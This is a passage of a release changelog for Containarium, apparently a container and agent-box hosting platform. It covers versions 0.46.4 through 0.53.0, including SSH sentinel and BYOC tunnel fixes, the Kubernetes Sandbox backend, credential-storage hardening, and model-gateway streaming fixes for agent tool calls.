  box over the tunnel, so the host needs no cert of its own. Bindings are
  cloud-authoritative and pushed over the admin-secret-gated
  `POST /sentinel/byoc-routes` — a host can never claim a hostname itself
  (anti-hijack). This ships the **sentinel-side surface only**; the cloud push
  and host-side box-port plumbing are follow-up slices, so end-to-end BYOC
  public ingress is not yet complete.
- **`ssh_ingress_host` on `debug_container` and `get_system_info`** (#1011).
  Both now report the backend's advertised public SSH entrypoint — or leave it
  empty to signal there is **no external SSH entrypoint** (direct / in-network
  mode). `debug_container` drops its generic "check the sentinel" hint when no
  entrypoint exists, so an agent no longer chases a jump host that isn't there.

### Fixed

- **Spot boot-disk recovery re-provisions host SSH accounts on startup**
  (#1010). When a spot/preemptible backend is recreated, its boot-disk
  `/etc/passwd` is wiped while the containers persist on the pool — leaving
  every pre-preemption box SSH-dark until someone ran `sync-accounts` by hand.
  The daemon now runs the account sync automatically on startup (LXC runtime,
  best-effort, non-blocking) and logs any box left without an account. The
  `sync-accounts` CLI no longer fails-closed on the benign "no key in
  container" case (control-plane / CI / workspace boxes).
- **`expose-port` and `route add/list/delete` honor `--http`** (#909). These
  verbs were gRPC-only and failed with an opaque name-resolver error against a
  REST control plane; they now select the HTTP client like every other verb
  (new typed HTTP route methods + a shared transport seam).

### Documentation

- **Sentinel per-source-IP SSH rate limit documented** (#933). Bursty SSH
  automation through the sentinel could be dropped mid-handshake with no hint
  that a limit was hit. The SSH guide now documents where the limit lives
  (`sshpiperd --max-failures` / `--ban-duration`), the shared-NAT amplification,
  how to tell it apart from the container's own `sshd`, and mitigations
  (raise the limit, spread egress, or reuse one connection via
  `ControlMaster`/`ControlPersist`).

## [0.53.0] - 2026-07-17

### Added

- **Box CRD operator** (#996) — agent boxes can be declared as Kubernetes
  custom resources (`containarium.dev/v1alpha1`, kind `Box`): `kubectl apply -f
  box.yaml` and `containarium create` converge on one resource and one reconcile
  loop, so the CLI, `kubectl`, and GitOps all drive one builder. Opt-in via the
  chart's `operator.enabled`; the imperative API is unchanged when it's off.
- **Developer-box mode** (#993) — a box can run an interactive SSH login shell
  instead of the forced-command MCP endpoint (`AGENTBOX_MODE=shell`, or the
  chart's `agentBox.mode` / `values-devbox.yaml`). Opt-in; the MCP-locked
  default is unchanged.
- **EKS/GKE reference architecture** (#992) — run the stack on managed
  Kubernetes behind a cloud LoadBalancer, with ready-made `values-gke.yaml` /
  `values-eks.yaml` / `values-devbox.yaml` presets and a deploy guide
  (`docs/EKS-GKE-DEPLOY.md`). The sentinel becomes the optional multi-cluster
  federation path.
- **Sentinel → in-cluster gateway SSH chain** (#981–#984) — one public SSH
  address fronts in-cluster gateways across the fleet: a backend-advertised
  ingress port, box-metadata `/authorized-keys`, sentinel-key authorization at
  the in-cluster gateway, and a tunnel dial-map for K8s gateways.
- **Daemon container image** (#1006) — `ghcr.io/footprintai/containarium` is now
  built and published per release, mirroring the sidecar images. Previously the
  containarium-k8s chart referenced a daemon image no CI produced, so
  `helm install` could not pull it; the chart is now Helm-deployable.
- A Dockerfile for `cmd/mcp-server` (#987) for the Glama-marketplace build.

### Fixed

- The daemon no longer hangs at startup on the Kubernetes runtime: it defaulted
  the collaborator store's Postgres URL to the LXC deployment's host and pinged
  it without a timeout, blocking before the gRPC/REST servers bound. It now
  skips that default on K8s and bounds the ping to 5s (#1008).
- The containarium-k8s chart now invokes the `daemon` subcommand (was `serve`)
  and its health probes hit `/health` (was `/healthz`) — latent bugs exposed
  once a real daemon image existed (#1006).
- The Box CRD applies without kubectl's `unrecognized format "int64"` warning
  (#998).
- `debug_container` no longer reports a container missing when it lives on a
  different backend than the daemon answering the request (#1002).
- The daemon no longer panics on incus-style disk quantities; they are
  normalized instead (#988).
- The per-box data PVC mounts at `/home/agent/workspace` rather than over
  `/home/agent`, so SSH auth on storage-backed boxes keeps working (#989).
- ZAP security scans fail fast when ZAP isn't installed, instead of a 120s
  timeout (#991).

### Changed

- Internal: the K8s `gatewayRouter` seam was formalized (#985); the sentinel
  proxyproto test pins the USE policy for the go-proxyproto v0.15.0 bump (#986);
  routine dependency bumps (#937, #938, #940, #941, #942).
- Docs: the EKS/GKE developer-box section (#994), KIND-QUICKSTART drift fixes
  (#990), and the mcp-server env-var schema for the Glama build spec (#1000).

## [0.52.1] - 2026-07-15

### Fixed

- The v0.52.0 tag's image publishing failed before pushing anything: the new
  `containarium-sshpiper` / `containarium-agent-box` jobs in `sidecars.yml`
  were missing the Buildx setup step, and provenance/SBOM attestation is not
  supported by the plain docker driver. v0.52.1 is the first tag where both
  images actually publish. (The v0.52.0 binaries released fine.)

## [0.52.0] - 2026-07-15

### Changed

- **The Kubernetes box backend now runs on the kubernetes-sigs/agent-sandbox
  `Sandbox` CRD** (#969, #970, #971, #972). The daemon declares one Sandbox
  CR per box and the agent-sandbox controller (a new install prerequisite —
  its v0.5.1 `manifest.yaml`) owns the pod and headless Service under it;
  the daemon keeps owning the per-tenant namespace, Secrets, NetworkPolicy,
  data PVC, and sshpiper Pipe. Start/Stop map to the CRD's native
  suspend/resume (`spec.operatingMode`) — suspend deletes only the pod,
  retaining PVC and identity. Box TTL is now honored on the k8s runtime via
  `spec.lifecycle.shutdownTime` (`shutdownPolicy: Retain`, with the sweeper
  completing the delete through the full cascade); Start/Stop/Delete/Resize
  RPCs, previously incus-only, are routed through the box backend.
  Pre-Sandbox k8s deployments must recreate their boxes — see the migration
  note in docs/K8S-AGENT-BOX-RUNTIME-DESIGN.md (home data survives via the
  daemon-owned `data` PVC).
- k8s.io dependencies bumped v0.31.3 → v0.36.2; Go toolchain 1.25 → 1.26
  (#968). The wake proxy migrated from the deprecated
  `httputil.ReverseProxy.Director` to `Rewrite`.

### Added

- **Container images now actually publish on release tags** (#977, #978):
  `ghcr.io/footprintai/containarium-agent-box` (the in-box MCP image — its
  Dockerfile claimed per-release publishing since it landed, but no
  workflow ever pushed it) and `ghcr.io/footprintai/containarium-sshpiper`
  (our own gateway image: the pinned upstream sshpiperd v1.5.3 release the
  sentinel already installs, with a kubernetes-plugin entrypoint), each
  tagged `:vX.Y.Z`, `:vX.Y`, `:latest-stable`.

### Fixed

- The helm chart's sshpiper image pin pointed at a never-published upstream
  path (403 on pull → ImagePullBackOff with `gateway.enabled=true`), and
  its Deployment template was missing plugin selection and the sshpiperd
  server host key entirely (#976, #977).
- `scripts/k8s-e2e.sh` waits for the agent-sandbox controller by
  deployment name — the upstream manifest carries no
  `control-plane=controller-manager` label, so a label-selector wait
  matched nothing (#972).

## [0.51.6] - 2026-07-14

### Fixed

- **A BYOC host's tunnel could lose connectivity forever after a routine
  sentinel restart** (#936). The sentinel's dynamic tunnel-token
  registry (`POST /sentinel/tunnel-tokens`, the path a cloud control
  plane's BYOC join flow uses) was pure in-memory — a sentinel process
  restart silently forgot every token registered at runtime, leaving
  any host whose tunnel session predated that restart on a credential
  the sentinel no longer recognized. The failure stayed invisible until
  that host's tunnel needed a fresh handshake (network blip, host
  reboot, tunnel-client restart), at which point it failed permanently
  with `handshake rejected: invalid token` and never recovered on its
  own. Registrations are now persisted to
  `/etc/containarium/tunnel-tokens.json` (root-only, 0600) and reloaded
  at sentinel startup alongside the static CLI-flag policy.
- **`pool join` baked the tunnel-handshake token into the world-readable
  systemd unit** (#935). The token is a bearer-equivalent credential —
  the sentinel's `TokenPolicy` grants standing tunnel access to
  whoever presents it — but it lived in plaintext on the
  `containarium-tunnel.service` unit's `ExecStart` line (0644,
  readable via `systemctl cat`/`ps`). It now lives in a root-only
  0600 `EnvironmentFile` (`/etc/containarium/tunnel-token.env`),
  matching the treatment `CONTAINARIUM_SENTINEL_AUTH_SECRET` already
  got in #687. `pool leave` cleans up the new file on exit.

## [0.51.5] - 2026-07-14

### Fixed

- **ZAP scan jobs retried forever with a generic 120-second timeout when
  ZAP was never installed on a host** (#960, #961). `EnsureDaemonRunning`
  unconditionally tried to start the ZAP daemon without checking whether
  the `InstallZap` RPC had ever been run for that host's security
  container. On an uninstalled host, the backgrounded `zap.sh` invocation
  silently failed inside the container and every scan job burned the
  full 120-second readiness poll before reporting a generic timeout —
  indistinguishable from a slow start, and repeating forever since
  nothing in that path ever installs ZAP. It now checks
  `Scanner.Available()` first and fails immediately with a clear
  "ZAP is not installed" error.
- **Keysync's orphan-`authorized_keys` WARNING didn't match the
  orphan-reaper's own safety gate** (#962). The reaper (fixed in #920
  after a real incident where an operator's own admin login got
  `userdel`'d) already refuses to delete any host account whose login
  shell isn't the containarium-managed wrapper — but the keysync
  handler's WARNING log had no equivalent check, so a real host admin
  account sharing the orphan directory shape logged a permanently
  misleading "orphan-reaper will clean up on next tick" that the reaper
  would never actually do. The WARNING now applies the exact same
  shell-eligibility check as the reaper.

## [0.51.4] - 2026-07-14

### Fixed

- **Host bearer permanently invalid after a cloud re-enroll** (#957). A
  join token embeds its own throwaway host id, minted fresh per token
  and never itself created as a host row. On first enroll the cloud
  control plane creates the host row using that id, so persisting the
  raw token as the durable bearer worked by coincidence. On re-enroll
  (`cloud enroll` / `pool join --cloud-control-plane` run again for a
  machine that already has a host row, matched on `oss_backend_id`),
  the control plane instead updates an *existing* row's bearer hash but
  returns that row's own, different id — the daemon kept persisting the
  raw join token (with the wrong, non-existent host id) into
  `cloud.yaml`, so every heartbeat/status call 401'd forever. `Enroll`
  and the REST enroll transport now rebuild the durable bearer as
  `<returned host id>.<token's secret half>` instead of reusing the raw
  token, so re-enrollment produces a bearer that actually resolves.

## [0.51.3] - 2026-07-14

### Added

- **Backups: back up every database automatically, don't require a
  name** (#954). Setting up a backup required typing the exact
  database name — most users don't know it offhand, and no layer
  validated it, so a typo just failed deep inside `pg_dump` with a
  cryptic error; a scheduled backup with a bad name failed silently
  forever with no notification. When `connection.database` is left
  empty (the new default), the daemon enumerates every non-template
  database (`Manager.ListDatabases`, reusing the same container-exec
  plumbing `pg_dump` itself uses) and backs up each one
  (`Manager.CreateAll`) — one database failing doesn't abort the
  others. An explicit database still works exactly as before.
  `CreateBackupResponse` gains `records` (always populated) and
  `failures` (per-database errors) alongside the existing `record`
  field.

## [0.51.2] - 2026-07-14

### Fixed

- **`pool join` never provisioned `CONTAINARIUM_SENTINEL_AUTH_SECRET` on
  the joining daemon** (Containarium-cloud#687). The sentinel's keysync
  signs every `/authorized-keys` request with this shared secret;
  without it on the daemon side, every sync cycle 401s, the host never
  accumulates users, and it never gets an sshpiper pipe entry — SSH to
  its containers silently never works. Confirmed live against a
  production sentinel's logs (`unexpected status 401 from
  http://127.0.0.216:8080/authorized-keys`). Terraform-provisioned GCP
  workhorses got this automatically via their startup script; hosts
  joined via `pool join` (BYO-compute) never did. Adds
  `--sentinel-auth-secret` to `pool join`, written to a root-only 0600
  env file and wired via `EnvironmentFile=` (never inline in the
  world-readable drop-in). Missing secret now warns explicitly instead
  of silently leaving SSH broken; keysync's own 401 log line now names
  the likely cause.
- **Container `image` field was always empty** (Containarium-cloud#870),
  showing as `unknown` for every adopted container in the webui. Not a
  discarded field on the cloud side — OSS never computed/returned an
  image at any layer. Incus already auto-populates `image.description` /
  `volatile.base_image` on every launch; now read through
  `ListContainers`/`GetContainer` into the `Container.image` proto
  field (already defined, previously always empty).

## [0.51.1] - 2026-07-13

### Fixed

- **Sentinel loopback-alias idempotency fix (#927) missed a second
  iproute2 already-exists message format** (#945). #927 treated
  "alias already present" as success, but its detection only matched
  `"File exists"` (older raw-netlink-style iproute2). A newer iproute2
  build reports the identical condition as `"Error: ipv4: Address
  already assigned."`, with no `"File exists"` substring at all —
  live-confirmed blocking a real BYOC host's tunnel reconnect on every
  single attempt, the exact "wedged forever" failure #927 set out to
  eliminate. (#946)

## [0.51.0] - 2026-07-13

### Fixed

- **Incus: retry transient "Instance not found" on GetInstanceState**
  (#931). The daemon's single long-lived Incus connection could get
  wedged for a specific instance, making `GetContainerMetrics` /
  `ListContainers` / `GetContainer` spuriously report an instance as
  gone even though `incus list`/`incus info` confirmed it was genuinely
  running — restarting the daemon cleared it, but it recurred within
  hours under normal polling load on affected hosts. Extends the
  existing `execWithRetry` precedent (a sibling liblxc transient-error
  fix) to `GetInstanceState`: a narrow, capped retry with linear
  backoff. A genuinely deleted instance still fails cleanly once
  retries are exhausted. (#932)
- **Sentinel: reconcile `sshpiper.service` against live metadata, not
  just at boot** (#933). The sentinel startup-script only runs once at
  boot, so tuning `sshpiper`'s failtoban flags (`--max-failures`/
  `--ban-duration`) in this repo never reached already-running
  sentinels — a production sentinel was found still running the
  *original* `--max-failures 3 --ban-duration 1h`, 33x stricter and
  12x longer-banning than the `100`/`5m` shipped two months earlier,
  causing legitimate clients to get silently banned for an hour on a
  handful of failed connection attempts. The `sshpiper.service` unit
  content now lives in its own instance-metadata key, with a new
  `sshpiper-reconcile.timer` (every 6h) that fetches and applies the
  current desired content live — no restart needed for future tuning
  to take effect. (#934)

### Added

- **Sentinel: `sentinel_admin_secret` Terraform variable** (#935,
  #936). Wires `CONTAINARIUM_SENTINEL_ADMIN_SECRET` through to the
  sentinel, enabling its existing (but previously unreachable)
  `POST /sentinel/tunnel-tokens` runtime path — the mechanism that lets
  a freshly-minted BYOC join token actually be registered with the
  sentinel's tunnel-handshake auth without a full sentinel restart.
  Terraform-only in this repo; a companion Containarium-cloud change
  calls this endpoint from `MintHostJoinToken`. (#943)

## [0.50.2] - 2026-07-11

### Fixed

- **Startup scripts: avoid `useradd` primary-group collision on admin
  usernames** (#929). Mirrors the fix already shipped in
  `startup-spot.sh` into the other 4 startup scripts
  (`terraform/gce/scripts/{startup,startup-sentinel}.sh`,
  `terraform/modules/containarium/scripts/{startup,startup-sentinel}.sh`).
  `useradd -G sudo <username>` auto-creates a same-named primary group,
  which fails outright if a group of that name already exists (e.g.
  "admin" collides with a group the stock Ubuntu GCE image ships) —
  under `set -euo pipefail` this could abort an entire sentinel
  bootstrap over one bad username (kafeido-infra#41).

### Changed

- Dependency bumps: `google.golang.org/grpc` 1.81.1 → 1.82.0,
  `github.com/pires/go-proxyproto` 0.12.0 → 0.14.0,
  `actions/checkout` 6 → 7, `azure/setup-helm` 4 → 5 (dependabot).

## [0.50.1] - 2026-07-11

### Fixed

- **Sentinel: make loopback-alias registration idempotent** (#927).
  `addLoopbackAlias` errored on `ip addr add`'s "File exists", which
  fires whenever a spot's deterministic loopback alias survives an
  ungraceful sentinel crash (skips the graceful-shutdown cleanup). Since
  the allocator's slot for a given spot ID never changes, this meant a
  spot could get stuck retrying the exact same doomed reconnect forever
  after any crash — a BYOC peer's tunnel was found wedged this way for a
  full week. The alias is now treated as already-satisfied instead of a
  fatal error, and failures surface the actual `ip` output instead of a
  bare exit code.
- **Network policy: converge `ip_tenant` deletes, not just adds** (#923).
  The reconcile loop upserted every managed container's tenant tag but
  never deleted stale ones, unlike the egress/deny maps which already
  diff-and-delete — a tag could leak past a container's IP being freed
  or reused, requiring a daemon restart to clear.

### Added

- **incus-watchdog: auto-recover a wedged incusd** (#755). incusd can
  hang with its process alive but its API unresponsive (a cgo call into
  liblxc's command protocol blocking forever on an unresponsive
  container monitor) — `systemctl restart` can't recover it because
  incusd's own signal handlers are part of the deadlock. A new systemd
  watchdog probes the API on an interval and, after repeated timeouts,
  force-kills and restarts the service; running instances survive
  (deploy/incus-watchdog/).

## [0.50.0] - 2026-07-10

### Fixed

- **Network policy: exclude the control plane from tenant tagging**
  (containarium-cloud#780). Cross-org isolation tags every managed
  container's IP with its tenant and drops cross-tenant traffic — but that
  also dropped a tenant's calls to a control plane co-located on the same
  backend host, since the control plane is a container and got tenant-tagged
  like any other (the eBPF egress allow-list can't override this — it's
  consulted only for non-container destinations). A new
  `core-controlplane` role, skipped by the enforcer's reconcile, keeps the
  control plane's IP out of the tenant map: tenants reach its auth-gated API
  as an external destination, and its own egress stays unenforced so it can
  actuate every box. Scoped to the control-plane role only — other core
  services stay tenant-isolated. Label the control-plane container
  `user.containarium.role=core-controlplane` to apply it.

### Added

- **`pool join --cloud-control-plane` — chain cloud self-registration onto
  the tunnel handshake, using the same join token** (containarium-cloud#799).
  Previously `pool join` only ever set up the tunnel; a host could connect
  fine and still never appear in a cloud control plane's own host list,
  because nothing called the separate `cloud enroll` step required to
  register it — a gap only discoverable by reading the CLI source, not
  documented anywhere a self-service BYOC user would see it. Now, when
  `--cloud-control-plane` is set (e.g. by the cloud webui's generated
  one-liner), `pool join` redeems the same token against `EnrollHost` right
  after the tunnel comes up, deriving `oss_backend_id` as `tunnel-<spot-id>`
  automatically. Best-effort: a cloud-enroll failure is a warning, not a
  join failure — the tunnel is joined either way. Opt-in; omit the flag for
  a plain OSS pool join with no cloud involvement.

## [0.49.2] - 2026-07-09

### Fixed

- **The orphan-reaper (#835) could delete a legitimate, manually-provisioned
  admin account that happened to live under `/home` with its own SSH key.**
  `RunOrphanReaper` swept every `/home/<name>` directory with an
  `authorized_keys` file and no matching `<name>-container`, with no way to
  tell a genuine Containarium tenant apart from an unrelated admin login
  sharing the same directory shape. It now only reaps accounts whose login
  shell is the containarium-managed shell wrapper — anything else (bash,
  zsh, etc.) is left alone even with no matching container. A real incident:
  upgrading a host's daemon (which enabled this reaper for the first time on
  that host) `userdel -r`'d an operator's own admin account mid-session.

## [0.49.1] - 2026-07-09

### Added

- **`POST /sentinel/tunnel-tokens` — register a tunnel-join token on a
  running sentinel without a restart** (#799). The sentinel's
  `TokenPolicy` was previously built once at startup from
  `--tunnel-token`/`--tunnel-token-policy` and never updated again, so
  any token minted afterwards (e.g. by a BYOC join flow that issues a
  fresh token per request) was permanently rejected with "invalid
  token" — not a transient failure, a structural one. Gated by a new,
  deliberately separate `CONTAINARIUM_SENTINEL_ADMIN_SECRET` (not the
  cluster-wide `CONTAINARIUM_SENTINEL_AUTH_SECRET` every daemon already
  holds for keysync/certsync — admitting a new node into a pool is a
  bigger capability than that). New CLI: `containarium sentinel
  register-token --url <sentinel> --token <token> [--pool <pool>]`.

## [0.49.0] - 2026-07-08

### Added

- **`oci-service` recipe** (#910) — generic run-an-OCI-image-as-an-always-on-
  service mechanism: pull a caller-specified image, run it via root podman
  with `--restart=always`, and publish its service port on the box's stable
  `:8080`. Parameters: `oci_image` (required), `service_port`, `command`
  (first token overrides the container entrypoint), `env_lines` (podman
  `--env-file` literal semantics). Application-agnostic building block; the
  first consumer is the cloud runtime API's agent sandboxes.


## [0.48.3] - 2026-07-08

### Fixed

- **The per-org network-policy enforcer couldn't identify containers
  created via the cloud's direct (push-mode) actuation path** — only
  containers created through the pull-based cloud-actuation client
  received `user.containarium.tenant`. Push-mode containers already
  carry the owning org's UUID under a different, pre-existing
  attribution label (`cloud_org_id`); `resolveTenant` now falls back to
  it when the explicit tenant label is absent, so both actuation modes
  are covered by the same enforcer logic. (#906)

## [0.48.2] - 2026-07-08

### Fixed

- **Cloud-assigned containers could permanently miss their `user.containarium.tenant`
  label, leaving them unmatched by the per-org network-policy enforcer.**
  `cloudContainerActuator.create()` stamps the tenant label correctly, but
  only the first time a container is created — the reconcile path for an
  already-existing container never re-checked it. A container created
  before this labeling logic was live on a given host would stay
  unmanaged indefinitely, regardless of how its org's network policy was
  configured. `EnsureRunning` now self-heals the label on every reconcile
  of an existing container (best-effort; a stamp failure doesn't block
  start/route convergence). (#903)

## [0.48.1] - 2026-07-03

### Fixed

- **v0.48.0's release build never published — `make build-release`'s full
  `next build` (with TypeScript type-checking) failed on two genuine
  compile errors from #886, neither caught at PR time because no CI job
  built the web UI at all.** `ContainerListView.tsx` destructured props
  omitted `onSecurityClick` even though it's declared in the props
  interface, used in the JSX, and already passed in by
  `ContainerTopology.tsx`. `PentestView.tsx` called
  `client.listPentestScanRuns(<limit>)` as a bare number, but the method's
  first positional param is the optional `containerName` string, not
  `limit` — fixed both call sites to `listPentestScanRuns(undefined,
  <limit>)`. No artifacts were ever published from the v0.48.0 tag, so it's
  left as a dead tag; this release supersedes it. (#896)

### CI

- Guard the web UI build inside the already-required "Unit + default e2e"
  job — the same "only caught at release time" gap as #884/#885's Windows
  cross-compile break, just for the web UI. A future TypeScript error now
  fails the PR instead of the release tag. (#896)

## [0.48.0] - 2026-07-03

### Added

- **Per-tenant pentest scan + CVE badge on container cards.** `PentestService`
  RPCs (`TriggerPentestScan`, `ListPentestScanRuns`, `GetPentestScanRun`,
  `ListPentestFindings`, `RemediatePentestFinding`) now accept a
  `container_name` and verify ownership via `AuthorizeContainerAccess`, so a
  tenant can scan/view/remediate their own container's Trivy CVE findings
  without admin scope; cluster-wide calls (no `container_name`) still require
  admin. Web UI: a severity badge (red critical/high, amber medium) appears on
  each container card/list row, opening a per-container dialog with scan
  history, findings, per-finding Fix (Trivy only), and a "Fix all critical &
  high" batch action. The Security tab itself stays admin-only in the nav.
  (#886)

### Fixed

- **`CONTAINARIUM_CONTAINER_ID` / OTel `container.id` stamped the OSS-side LXC
  name instead of the cloud UUID cloud-managed containers actually need.**
  Containarium-cloud already sends the container's cloud UUID at create time
  via `labels["cloud_container_id"]`, but every OTel env-var stamping path
  (create, adopt/migrate re-stamp, `ToggleMonitoring` re-stamp) ignored it and
  stamped the derived `cld-<8hex>-container` name instead. Since the cloud
  control plane's metrics queries filter strictly on the cloud UUID, every
  cloud-managed container's app-emitted metrics were silently unqueryable —
  the cloud dashboard showed "monitoring not enabled" even when telemetry was
  actually flowing under the wrong label. `container.OTelContainerID` now
  prefers the cloud label when present, falling back to the OSS name
  otherwise (unchanged behavior for operator-created containers). (#893)
- **Windows client cross-compile broke the v0.47.0 release build, publishing
  no artifacts.** `internal/cmd/upgrade_watchdog.go` (added in #865) pulled in
  the Linux-only eBPF loader with no `//go:build !windows` guard, so
  `GOOS=windows go build ./cmd/containarium/` failed — breaking `make
  build-all` and the whole release pipeline. Pre-existing since #865; v0.47.0
  was just the first release to surface it. (#884)

### CI

- Guard the Windows client cross-compile inside the already-required "Unit +
  default e2e" job, so a future cmd file that imports the Linux-only netbpf
  loader without the `!windows` guard fails at PR time instead of at release
  time — the same regression class that broke v0.47.0. (#885)

### Documentation

- Security FAQ on shared-kernel isolation: what tenants are actually isolated
  by (namespaces/cgroups + eBPF network policy, not a hypervisor boundary),
  and an explicit flag that Cloud's low-friction free-tier signup is an open
  gap against that model. (#888)
- Kernel-patch runbook: gap analysis (no automated host-kernel CVE remediation
  path today) and an interim manual procedure, tracking the two fixes that
  close it (#889 drain-and-relocate, #890 live kernel patching) plus follow-on
  kernel-CVE monitoring (#891). (#892)

## [0.47.0] - 2026-06-30

### Added

- **Per-box default memory floor on the Kubernetes backend.** Boxes created on
  the `k8s` runtime with no explicit memory previously ran with no resource
  requests or limits, so the scheduler couldn't bin-pack them and a single box
  could balloon and pressure its neighbors on the shared host kernel. They now
  get a default memory request/limit (`256Mi`/`1Gi`, with the request kept below
  the limit so idle boxes still pack densely). GPU boxes are exempt (sized
  explicitly), the request is clamped to the limit, and an invalid operator
  override degrades to the built-in default rather than disabling the floor.
  Configurable via `CONTAINARIUM_K8S_DEFAULT_MEMORY_{REQUEST,LIMIT}` and
  `CONTAINARIUM_K8S_DISABLE_MEMORY_FLOOR`. (#871)

### Changed

- **Environment configuration consolidated into a typed `internal/config`
  package.** The `CONTAINARIUM_*` environment variables — previously read inline
  via `os.Getenv` calls scattered across the tree — now have `Env*` name
  constants as the single source of truth, with typed `Load`/`Validate` per
  namespace. Migrated: SENTINEL (#872), K8S (#873), NETWORK (#874), JWT (#879),
  and OTEL/WAF/GATEWAY (#880). No behavior change for operators — same variables,
  same semantics; for NETWORK this also collapsed several duplicated inline
  enforce/signature switches into one typed load.
- **KMS credential loading lifted out of `pkg/core/secrets`.** The KMS backend
  selector and the AWS / Vault / GCP credential readers (env + file-fallback +
  validation) moved to the app layer (`internal/secrets`), so `pkg/core/secrets`
  no longer reads the environment — it exposes only the typed config structs and
  constructors. Same `CONTAINARIUM_{KMS,AWS,VAULT,GCP}_*` variables and
  behavior. (#876)

### Documentation

- K8s agent-box design doc: completed the backend env-var table (all 13
  variables, including `GATEWAY_SSH_PORT` and `INSECURE_IGNORE_HOST_KEY`) and
  noted the new typed `config.LoadK8s()` loader. (#881)

### Chores

- Ignore local `.worktrees/` git worktrees so a stray `git add -A` cannot commit
  them as embedded repositories. (#877)

## [0.46.10] - 2026-06-25

### Fixed

- **Model-gateway corrupted streamed responses for gzip-requesting clients — the
  root cause of the managed workspace chat failing to use tools.** The gateway
  forwarded the client's `Accept-Encoding` header to the upstream provider. A
  client that requests gzip (LibreChat / Node's undici) therefore made the
  provider **gzip the SSE stream**, and the streaming filter read the **raw
  compressed bytes as text** — so every chunk (content, `tool_calls`,
  `finish_reason`) was garbage, the tool-call processing never ran, and the
  agent client received a corrupted stream and aborted (`terminated`) before it
  could run the tool-result round. (`curl` probes never sent `Accept-Encoding`,
  so they always worked — masking the bug.) The gateway now **strips
  `Accept-Encoding` before proxying upstream**, so Go's transport owns the
  encoding and transparently decompresses, and the filter reads plain SSE. This
  is the keystone of the agentic tool-calling chain: v0.46.3 (finish_reason),
  v0.46.4 (envelope), v0.46.6 (delta index), v0.46.7 (flash-lite), v0.46.8/9
  (finish/[DONE]) fixed the *parsed-chunk* conformance — this makes the bytes
  actually parseable. The managed workspace chat now calls platform tools and
  returns results end-to-end (verified live). Daemon-side — existing boxes
  benefit after a workhorse roll.

## [0.46.9] - 2026-06-25

### Fixed

- **Workspace tool calls hung the gateway because `[DONE]` was a separate write
  the agent client never drained.** A LangChain agent client (LibreChat) stops
  reading round-1 the instant it has the tool_call, to go execute the tool. The
  gateway then wrote `[DONE]` as a SEPARATE write — which blocks on the
  unbuffered response pipe when the client has stopped draining, so the round-1
  request never completed (no END) and the client's stream `terminated` before
  round-2. The gateway now **coalesces the final tool-turn chunk and `[DONE]`
  into a single write**, so the client receives the stream terminator in the same
  read it already does (before it stops draining) — round-1 ends cleanly and the
  client runs the tool-result round. (Direct/draining clients are unaffected;
  the post-loop no longer double-sends `[DONE]`.) Final piece of the agentic
  tool-calling chain (v0.46.3–v0.46.8). Daemon-side — existing boxes benefit
  after a workhorse roll.

## [0.46.8] - 2026-06-25

### Fixed

- **Workspace chat tool turns hung the gateway → "terminated" before the result
  round.** On a tool turn the gateway kept reading the provider after the
  `finish_reason` arrived, waiting for Gemini to close the SSE stream — but
  Gemini's OpenAI-compat doesn't reliably close a tool stream, and a LangChain
  agent client (LibreChat) abandons round-1 the instant it has the `tool_call`.
  The result: the round-1 gateway request never completed (no END), and the
  client's HTTP stream "terminated", aborting the turn before it could run the
  tool-result round. The gateway now **stops reading and emits its own `[DONE]` +
  closes immediately when a tool turn's `finish_reason` is seen**, so round-1
  completes promptly and the client proceeds to round-2. Content turns are
  unchanged (they drain fully, preserving any trailing usage chunk). This is the
  final piece of the agentic tool-calling chain (v0.46.3/4/6/7).

## [0.46.7] - 2026-06-25

### Fixed

- **Workspace chat tool calls now complete the full round-trip.** The tool-using
  workspace agent now runs on **`gemini-2.5-flash-lite`** instead of
  `gemini-flash-latest`. Gemini 2.5's thinking models require a
  `thought_signature` to be echoed back on EVERY tool-result round-trip on the
  OpenAI-compat surface (round-2 otherwise 400s: "Function call is missing a
  thought_signature"), and a LangChain/LibreChat client can't carry that
  non-standard field — so the chat fired the tool but the turn terminated before
  returning the result. `gemini-2.5-flash-lite` (non-thinking) uses standard
  function-calling that round-trips cleanly (verified: round-2 = 200). The agent,
  its model-spec, and the endpoint's model list now use the lite model; chat-only
  skill personas keep `gemini-flash-latest`. Completes the agentic tool-calling
  chain (v0.46.3 finish_reason + v0.46.4 envelope + v0.46.6 delta index). Existing
  workspace boxes need a redeploy (the agent + spec are baked at deploy).

## [0.46.6] - 2026-06-25

### Fixed

- **Workspace chat tool calls aborted after firing ("terminated") — now
  complete.** Gemini's OpenAI-compat surface streams `tool_calls` deltas that
  OMIT the `index` field and add a non-standard `extra_content`
  (`thought_signature`). A LangChain-based client (LibreChat v0.8.6) merges
  streamed tool-call deltas BY `index`; without it the stream parser throws and
  aborts the turn (`sendCompletion … terminated`) right after the tool call is
  emitted — so the tool fired but the result/summary never came back. The
  model-gateway now standardizes tool_calls deltas on the OpenAI-shaped paths:
  it injects a position-based `index` where missing and strips `extra_content`,
  so the client assembles the call, runs the tool, and the model summarizes the
  result. Completes the agentic tool-calling chain for the managed workspace
  (with v0.46.3 finish_reason + v0.46.4 envelope fixes). Daemon-side — existing
  workspace boxes benefit after a workhorse roll, no redeploy.

## [0.46.5] - 2026-06-25

### Fixed

- **Managed workspace chat can now actually use platform tools.** The LibreChat
  `librechat` recipe wired the MCP server but its default model-spec targeted the
  **custom** endpoint, which does not expose MCP tools — only LibreChat's
  **agents** endpoint does. So the chat replied with generic shell advice ("run
  `docker ps`") instead of calling `list_containers`/`create_container`/etc. The
  recipe now, when the MCP is wired, creates a tool-equipped LibreChat **agent**
  in `post_start` (all MCP tools attached, with workspace instructions) and
  `gen_modelspecs.py` emits the default "Containarium Workspace" spec on the
  `agents` endpoint referencing that agent (`/opt/lc/agent-id`). The chat now
  calls platform tools and acts on the user's boxes. Skill personas stay
  chat-only on the custom endpoint; with no MCP/agent the default falls back to
  the custom endpoint as before. (Existing workspace boxes must be redeployed to
  pick this up — the agent + spec are baked at deploy time.)

## [0.46.4] - 2026-06-25

### Fixed

- **Model-gateway streaming hung agent chats (LibreChat "Error connecting to
  server" / "Generation timed out").** On the leak-filter path (active whenever a
  system prompt is present — i.e. every agent turn), the gateway re-serialized
  streamed content into *minimal* chunks (`{choices:[{index,delta:{content}}]}`)
  that dropped the upstream envelope (`id`/`object`/`created`/`model`). Strict
  clients (LibreChat v0.8.6) reject such chunks and the stream silently hangs
  until the client's stale-job reaper fires. The gateway now captures the
  upstream envelope from the first chunk and stamps every synthesized chunk
  (held-back content, redaction note, finish/usage envelope) with the same
